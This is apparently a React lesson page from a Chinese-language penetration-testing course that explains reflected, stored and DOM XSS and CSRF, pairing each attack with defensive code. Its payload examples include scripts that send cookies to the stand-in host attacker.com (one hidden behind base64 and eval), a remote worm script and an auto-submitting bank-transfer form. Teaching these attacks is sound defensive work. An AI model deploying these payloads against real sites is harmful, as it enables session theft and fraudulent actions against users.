import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LessonCommon.css';

const XSS_TYPES = [
  {
    name: '反射型 XSS', color: '#f87171', icon: '🪃',
    desc: '恶意脚本包含在请求中，立即反射给受害者。最常见于搜索框/错误消息。',
    steps: [
      '攻击者构造含 XSS Payload 的 URL',
      '诱导受害者点击该链接（钓鱼邮件）',
      '服务器将 Payload 原样反射到响应页面',
      '受害者浏览器执行恶意脚本',
      '窃取 Cookie/SessionToken 发送到攻击者服务器',
    ],
    payload: `<!-- 经典 XSS Payload -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- 绕过简单过滤 -->
<img src=x onerror="fetch('http://attacker.com/?c='+btoa(document.cookie))">
<svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vP2M9JytidG9hKGRvY3VtZW50LmNvb2tpZSkp'))">
<script>new Image().src='http://attacker.com/log?'+document.cookie;</script>

<!-- 攻击者服务器接收到 -->
# GET /log?JSESSIONID=abc123;authToken=eyJhbGci...`,
    fix: `# ✅ 服务端输出转义（根本防御）
# React/Vue 默认转义：dangerouslySetInnerHTML={} 少用！

# Python 转义
from html import escape
safe_output = escape(user_input)    # < → &lt;  > → &gt;

# ✅ Content Security Policy（CSP）纵深防御
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-{random}';  # 禁止内联脚本
  object-src 'none';

# ✅ HttpOnly Cookie（脚本无法访问 document.cookie）
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict

# ✅ 输入验证（白名单，不依赖黑名单）`,
  },
  {
    name: '存储型 XSS', color: '#dc2626', icon: '💾',
    desc: '最危险！Payload 永久存储在数据库中，每个访问该页面的用户都会被攻击。常见于评论/论坛。',
    steps: [
      '攻击者在评论/昵称/个人简介中注入 XSS Payload',
      '服务器将恶意内容存入数据库',
      '任意用户访问含该内容的页面',
      '服务器从 DB 取出恶意脚本并渲染到 HTML',
      '受害者浏览器执行，攻击影响所有访客',
    ],
    payload: `<!-- 攻击者在评论框输入（存储型）：-->
这个商品不错！<script>
  // 每个查看评论的人都会被攻击
  const data = {
    cookie: document.cookie,
    url: window.location.href,
    user: document.querySelector('.username')?.textContent
  };
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
</script>

<!-- 蠕虫型：感染的用户自动替他发帖（Samy蠕虫 2005年）-->
<script src="http://attacker.com/worm.js"></script>`,
    fix: `# ✅ 存入 DB 前：清理（DOMPurify 或后端 html-sanitize）
import bleach
# 允许白名单标签（如果必须允许HTML）
safe_html = bleach.clean(user_input,
    tags=['b', 'i', 'u', 'em', 'strong'],  # 严格白名单
    attributes={},
    strip=True)

# ✅ 取出渲染时：再次转义（双重保护）
# React 默认转义（{unsafeHtml} 是安全的，dangerouslySetInnerHTML 才危险）

# ✅ 富文本编辑器：使用 DOMPurify（前端）
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'a'],
  ALLOWED_ATTR: ['href']  // 不允许 onerror/onload 等事件属性
})`,
  },
  {
    name: 'DOM 型 XSS', color: '#f97316', icon: '🌳',
    desc: 'Payload 不经过服务器，直接由前端 JS 处理后写入 DOM。SPA 应用更易受影响。',
    steps: [
      '攻击者构造含 Payload 的 URL（#hash 部分）',
      '受害者访问该 URL',
      '前端 JS 读取 URL 参数并直接写入 DOM',
      '浏览器解析新 DOM，执行注入的脚本',
      '服务器完全感知不到攻击（无 HTTP 请求）',
    ],
    payload: `<!-- 漏洞代码：将 URL hash 直接写入 DOM -->
<script>
  // 危险！hash 内容未经转义直接插入
  document.getElementById('output').innerHTML = location.hash.slice(1);
</script>

<!-- 攻击 URL：-->
http://example.com/#<img src=x onerror=alert(document.cookie)>

<!-- 其他 DOM Sink（危险 API）：-->
document.write()       // 危险
eval()                 // 危险
innerHTML / outerHTML  // 危险（需转义）
location.href = userInput  // 可能导致 javascript: 协议`,
    fix: `// ✅ 使用 textContent 代替 innerHTML
// 危险：
element.innerHTML = userInput;

// 安全：
element.textContent = userInput;  // 自动转义

// ✅ 需要动态 HTML 时，使用 DOM API 构建
const a = document.createElement('a');
a.href = sanitizedUrl;   // 额外验证协议不是 javascript:
a.textContent = linkText;
container.appendChild(a);

// ✅ 避免 eval() 和 new Function()
// ✅ URL 参数用 DOMPurify 清理后再使用
// ✅ CSP hash/nonce 防止内联脚本执行`,
  },
  {
    name: 'CSRF 攻击', color: '#a78bfa', icon: '🔄',
    desc: 'Cross-Site Request Forgery：跨站请求伪造。利用受害者在目标网站的已登录会话，伪造请求。',
    steps: [
      '受害者登录了 bank.com（浏览器保存了 Cookie）',
      '受害者访问攻击者控制的恶意网站',
      '恶意网站自动发起对 bank.com 的转账请求',
      '浏览器自动携带 bank.com 的 Cookie（这是关键）',
      '银行服务器认为是合法请求，完成转账',
    ],
    payload: `<!-- 恶意网站页面（受害者访问后自动执行）-->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
    <!-- 浏览器自动携带 bank.com 的 Cookie！-->
  </form>
</body>
</html>

<!-- GET 型 CSRF（更简单）-->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- 图片请求自动发出，同时携带登录Cookie -->`,
    fix: `# ✅ CSRF Token（服务端随机生成，表单必须携带）
from fastapi import Request
import secrets

@app.get("/transfer-page")
async def transfer_page(request: Request):
    # 生成 token 存入 session
    token = secrets.token_hex(32)
    request.session["csrf_token"] = token
    return templates.TemplateResponse("transfer.html", {"csrf_token": token})

@app.post("/transfer")
async def do_transfer(
    request: Request,
    csrf_token: str = Form(...)
):
    if csrf_token != request.session.get("csrf_token"):
        raise HTTPException(403, "CSRF token 无效")
    ...

# ✅ SameSite Cookie（现代浏览器内置防护）
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
# SameSite=Strict：跨站请求完全不携带 Cookie
# SameSite=Lax：GET 请求携带，POST 不携带（更兼容）`,
  },
];

export default function LessonXSSCSRF() {
  const navigate = useNavigate();
  const [activeType, setActiveType] = useState(0);
  const [activeStep, setActiveStep] = useState(null);
  const [view, setView] = useState('attack');

  const t = XSS_TYPES[activeType];

  return (
    <div className="lesson-sec">
      <div className="sec-badge orange">🎭 module_04 — XSS / CSRF</div>
      <div className="sec-disclaimer">⚠️ 以下攻击演示代码仅用于理解漏洞原理。请在授权靶机环境练习，勿对真实网站测试。</div>

      <div className="sec-hero">
        <h1>XSS / CSRF / 点击劫持：客户端攻击全解</h1>
        <p>XSS 让攻击者在受害者浏览器中执行任意 JS，CSRF 让受害者的浏览器以受害者身份发起恶意请求。<strong>两者都依赖浏览器的信任机制</strong>，但攻击方向相反。</p>
      </div>

      {/* 四类攻击切换 */}
      <div className="sec-section">
        <h2 className="sec-section-title">⚔️ 四大客户端攻击（点击切换）</h2>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '1rem' }}>
          {XSS_TYPES.map((type, i) => (
            <button key={i} onClick={() => { setActiveType(i); setActiveStep(null); setView('attack'); }}
              style={{ flex: 1, minWidth: 150, padding: '0.75rem', borderRadius: '10px', cursor: 'pointer', textAlign: 'center', fontWeight: 700,
                border: `1px solid ${activeType === i ? type.color + '60' : 'rgba(255,255,255,0.07)'}`,
                background: activeType === i ? `${type.color}10` : 'rgba(255,255,255,0.02)',
                color: activeType === i ? type.color : '#5a1a1a', fontSize: '0.85rem' }}>
              <div style={{ fontSize: '1.2rem', marginBottom: '0.2rem' }}>{type.icon}</div>
              {type.name}
            </button>
          ))}
        </div>

        {/* 描述 */}
        <div style={{ padding: '0.75rem 1rem', background: `${t.color}08`, border: `1px solid ${t.color}25`, borderRadius: '8px', fontSize: '0.82rem', color: '#5a1a1a', marginBottom: '0.875rem' }}>
          {t.desc}
        </div>

        {/* 攻击步骤 */}
        <div style={{ marginBottom: '0.875rem' }}>
          <div style={{ fontSize: '0.78rem', color: '#5a1a1a', marginBottom: '0.4rem', fontWeight: 700 }}>🎯 攻击步骤（点击展开）</div>
          {t.steps.map((step, i) => (
            <div key={i} onClick={() => setActiveStep(activeStep === i ? null : i)}
              style={{ display: 'flex', gap: '0.6rem', padding: '0.5rem 0.75rem', borderRadius: '6px', cursor: 'pointer', marginBottom: '0.2rem', alignItems: 'flex-start', transition: 'all 0.13s',
                background: activeStep === i ? `${t.color}0c` : 'rgba(255,255,255,0.02)',
                border: `1px solid ${activeStep === i ? t.color + '45' : 'rgba(255,255,255,0.05)'}` }}>
              <span style={{ width: 20, height: 20, borderRadius: '50%', background: `${t.color}20`, color: t.color, fontSize: '0.65rem', fontWeight: 900, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>{i + 1}</span>
              <span style={{ fontSize: '0.8rem', color: activeStep === i ? t.color : '#5a1a1a' }}>{step}</span>
            </div>
          ))}
        </div>

        {/* 攻击/修复代码 */}
        <div style={{ display: 'flex', gap: '0.4rem', marginBottom: '0.5rem' }}>
          <button className={`sec-btn ${view === 'attack' ? 'attack' : ''}`} onClick={() => setView('attack')}>⚔️ Payload 示例</button>
          <button className={`sec-btn defense ${view === 'fix' ? 'active' : ''}`} onClick={() => setView('fix')}>🛡 防御代码</button>
        </div>
        <div className="sec-terminal">
          <div className="sec-terminal-header">
            <div className="sec-terminal-dot" style={{ background: '#ef4444' }} />
            <div className="sec-terminal-dot" style={{ background: '#f59e0b' }} />
            <div className="sec-terminal-dot" style={{ background: '#22c55e' }} />
            <span style={{ marginLeft: '0.5rem', color: view === 'attack' ? t.color : '#22c55e' }}>
              {t.icon} {t.name} — {view === 'attack' ? 'Payload' : '防御方案'}
            </span>
          </div>
          <div className="sec-terminal-body" style={{ color: view === 'attack' ? '#ffd0d0' : '#c0ffd0', fontSize: '0.75rem' }}>
            {view === 'attack' ? t.payload : t.fix}
          </div>
        </div>
      </div>

      {/* XSS vs CSRF 区别 */}
      <div className="sec-section">
        <h2 className="sec-section-title">⚖️ XSS vs CSRF 核心区别</h2>
        <div className="sec-card">
          <table className="sec-table">
            <thead><tr><th>维度</th><th>⚔️ XSS</th><th>🔄 CSRF</th></tr></thead>
            <tbody>
              {[
                ['攻击目标', '受害者浏览器（注入脚本）', '受害者会话（伪造请求）'],
                ['利用机制', '浏览器信任服务器的脚本', '服务器信任浏览器的 Cookie'],
                ['攻击者获得', '受害者的 Cookie/Token/键盘输入', '以受害者身份执行操作'],
                ['主要防御', 'CSP + HttpOnly + 输出转义', 'CSRF Token + SameSite Cookie'],
                ['是否需代码注入', '✅ 是，注入 JS 代码', '❌ 否，利用已有会话'],
              ].map(([d, x, c]) => (
                <tr key={d}>
                  <td style={{ fontWeight: 700, color: '#fbbf24', fontSize: '0.82rem' }}>{d}</td>
                  <td style={{ fontSize: '0.8rem', color: '#f87171' }}>{x}</td>
                  <td style={{ fontSize: '0.8rem', color: '#a78bfa' }}>{c}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div className="sec-nav">
        <button className="sec-btn" onClick={() => navigate('/course/security-pentest/lesson/sqli')}>← 上一模块</button>
        <button className="sec-btn attack" onClick={() => navigate('/course/security-pentest/lesson/recon')}>下一模块：渗透流程 →</button>
      </div>
    </div>
  );
}
